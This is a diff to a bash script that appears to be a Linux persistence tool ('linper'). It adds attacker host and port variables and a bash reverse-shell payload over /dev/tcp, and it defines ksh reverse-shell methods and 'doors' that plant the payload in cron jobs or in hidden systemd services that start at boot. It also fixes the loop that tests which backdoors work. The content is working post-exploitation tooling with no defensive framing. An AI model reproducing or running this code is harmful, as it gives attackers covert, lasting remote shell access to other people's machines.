@@ -1,6 +1,10 @@
 #!/bin/bash
 
 # Modular version
+attackBox=0.0.0.0
+attackPort=5253
+cron="* * * * *"
+payload="bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1'"
 
 methods=(
 	"ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
@@ -8,8 +12,8 @@ methods=(
 )
 
 doors=(
-	"crontab,if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron | grep linper,echo \"$cron $payload\":" 
-	"systemctl,if touch /etc/systemd/.temp,export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
+	"crontab,if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron; cat /dev/shm/.cron | grep -v linper > /dev/shm/.rcron; crontab /dev/shm/.rcron; if grep [A-Za-z0-9] /dev/shm/.rcron; then crontab /dev/shm/.rcron; else crontab -r; fi; grep linper /dev/shm/.cron,echo \"$cron $payload\":" 
+	"systemctl,if touch /etc/systemd/.temp; rm /etc/systemd/.temp,export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
 )
 
 #return method and payload of available
@@ -49,7 +53,7 @@ enum_doors() {
 		hinge=$(echo $s | awk -F ',' '{print $3}')
 		echo "hinge = " $hinge
 		echo "----------------------------"
-		if $(echo $method | grep -qi "[a-z]")
+		if $(echo $door | grep -qi "[a-z]")
 		then
 			#echo "method = " $method
 			#echo "eval staement = " $eval_statement
@@ -58,7 +62,7 @@ enum_doors() {
 			echo "$eval_statement"; echo "$eval_statement" | $SHELL 2> /dev/null
 			if [ $? -eq 0 ];
 			then
-				echo -e "\e[92m[+]\e[0m $door"
+				echo -e "\e[92m[+]\e[0m $door works"
 			fi
 		fi
 	done
